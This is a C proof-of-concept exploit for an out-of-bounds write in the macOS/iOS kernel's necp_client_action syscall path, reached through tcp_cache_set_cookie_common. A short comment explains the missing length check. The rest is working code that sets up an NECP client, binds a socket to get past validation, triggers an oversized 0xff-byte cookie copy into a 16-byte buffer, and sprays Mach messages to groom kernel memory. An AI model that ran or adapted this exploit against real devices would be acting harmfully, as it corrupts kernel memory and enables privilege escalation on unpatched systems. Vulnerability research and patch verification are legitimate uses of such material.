// lvbluesky
/*
MacOS/iOS kernel necp_client_action OOB write vulnerability

necp_client_action is the handler for syscall SYS_necp_client_action. Inside this function necp_client_update_cache will be invoked when action is NECP_CLIENT_ACTION_UPDATE_CACHE.
The vulnerability exits in function tcp_cache_set_cookie_common of xnu4570.41.2.
necp_client_update_cache->tcp_heuristics_tfo_update->tcp_cache_set_cookie_common:
static void tcp_cache_set_cookie_common(struct tcp_cache_key_src *tcks, u_char *cookie, u_int8_t len)
{
    struct tcp_cache_head *head;
    struct tcp_cache *tpcache;

    tpcache = tcp_getcache_with_lock(tcks, 1, &head);
    if (tpcache == NULL)
        return;

    tpcache->tc_tfo_cookie_len = len;
    memcpy(tpcache->tc_tfo_cookie, cookie, len);     //OOB write here! There is no check for len and len comes from user input

    tcp_cache_unlock(head);
}

The vulnerability affects macOS<10.13.4, iOS<11.3
*/

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/in.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <mach/mach_port.h>

#define reinterpret_cast_mach_vm_address_t(p)     ((mach_vm_address_t) (uintptr_t) p)
typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_descriptor_t desc[0x100];
} mach_msg_spray_t;

#pragma pack(1)
    typedef struct para{
        uint8_t type;
        uint32_t len;
        uint8_t tag;
        struct sockaddr_in taddr;
        uint8_t pad[6];
    }necp_client_add_para;
#pragma pack(0)

    typedef struct necp_cache_buffer {
      u_int8_t                necp_cache_buf_type;    //  NECP_CLIENT_CACHE_TYPE_*
      u_int8_t                necp_cache_buf_ver;     //  NECP_CLIENT_CACHE_TYPE_*_VER
      u_int32_t               necp_cache_buf_size;
      mach_vm_address_t       necp_cache_buf_addr;
    } necp_cache_buffer;


    typedef struct necp_tcp_tfo_cache {
      u_int8_t                necp_tcp_tfo_cookie[16];
      u_int8_t                necp_tcp_tfo_cookie_len;
      u_int8_t                necp_tcp_tfo_heuristics_success:1; // TFO succeeded with data in the SYN
      u_int8_t                necp_tcp_tfo_heuristics_loss:1; // TFO SYN-loss with data
      u_int8_t                necp_tcp_tfo_heuristics_middlebox:1; // TFO middlebox detected
      u_int8_t                necp_tcp_tfo_heuristics_success_req:1; // TFO succeeded with the TFO-option in the SYN
      u_int8_t                necp_tcp_tfo_heuristics_loss_req:1; // TFO SYN-loss with the TFO-option
      u_int8_t                necp_tcp_tfo_heuristics_rst_data:1; // Recevied RST upon SYN with data in the SYN
      u_int8_t                necp_tcp_tfo_heuristics_rst_req:1; // Received RST upon SYN with the TFO-option
    } necp_tcp_tfo_cache;

int necp_open(int flags) {
    return syscall(SYS_necp_open, flags);
}

int necp_client_action(int necp_fd, uint32_t action, uuid_t client_id, size_t client_id_len, uint8_t* buffer, size_t buffer_size) {
    return syscall(SYS_necp_client_action, necp_fd, action, client_id, client_id_len, buffer, buffer_size);
}


void spray(int num)
{
    kern_return_t kr = 0;
    mach_port_t myport[0x1000];

    mach_msg_spray_t msg = {0};
    msg.header.msgh_local_port = MACH_PORT_NULL;
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg.header.msgh_size = sizeof(msg);
    msg.header.msgh_id = 0x44444444;
    
    msg.body.msgh_descriptor_count = 0x100;   
    uint8_t buffer[80] = {0};
    for(int j=0;j<80;j++)
        buffer[j]=3;
    for (int i=0; i<msg.body.msgh_descriptor_count; i++)
    {
        msg.desc[i].out_of_line.address = buffer;
        msg.desc[i].out_of_line.size = 80 - 0x18;  
        msg.desc[i].out_of_line.type = MACH_MSG_OOL_DESCRIPTOR;
    }
    
    for(int i=0; i<num;i++)
    {
        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &myport[i]);
        msg.header.msgh_remote_port = myport[i];
        kr = mach_msg(&msg.header, MACH_SEND_MSG, msg.header.msgh_size, 0, 0, 0, 0);
    }
}

int main() {
    int fd = necp_open(0);
    uint64_t interface_id[2];

    struct sockaddr_in server_addr;
    server_addr.sin_len = sizeof(struct sockaddr_in);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(11332);
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    bzero(&(server_addr.sin_zero),8);
    necp_client_add_para p;
    p.type=0xd;
    p.len=sizeof(server_addr)+0xd;
    
    //To bypass check of flow in necp_client_update_cache
    p.taddr=server_addr;
    //necp_client_add  
    int ret=necp_client_action(fd,
                    1,
                    interface_id,
                    0x10,
                    &p,
                    0x22);
    if(ret==-1)
    {
        perror("error");
        return 1;
    }

    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == -1) {
        perror("socket error");
        return 1;
    }
    int bind_result = bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));
    if (bind_result == -1) {
        perror("bind error");
        return 1;
    }
    
    //To bypass check of current_route in necp_client_update_cache
    ret=setsockopt(server_socket, SOL_SOCKET, 0x1111, interface_id, 0x10);
    if(ret==-1)
        perror("setsockopt error ");

    necp_tcp_tfo_cache pcache;
    pcache.necp_tcp_tfo_cookie_len=0xff;                     //len value
    pcache.necp_tcp_tfo_heuristics_rst_req=0;
    pcache.necp_tcp_tfo_heuristics_rst_data=0;
    pcache.necp_tcp_tfo_heuristics_loss_req=0;
    pcache.necp_tcp_tfo_heuristics_success_req=0;
    pcache.necp_tcp_tfo_heuristics_middlebox=0;
    pcache.necp_tcp_tfo_heuristics_loss=0;
    pcache.necp_tcp_tfo_heuristics_success=0;
    for(int t=0;t<0x10;t++)
        pcache.necp_tcp_tfo_cookie[t]=0x44;

    necp_cache_buffer p2;
    p2.necp_cache_buf_type=2;
    p2.necp_cache_buf_ver=1;
    p2.necp_cache_buf_size=0x12;
    p2.necp_cache_buf_addr=reinterpret_cast_mach_vm_address_t(&pcache);

    //invoke vulnerability
    ret=necp_client_action(fd,
                    14,
                    interface_id,
                    0x10,
                    &p2,
                    sizeof(p2));
    close(fd);
    spray(0x1000);
    return 0;
}
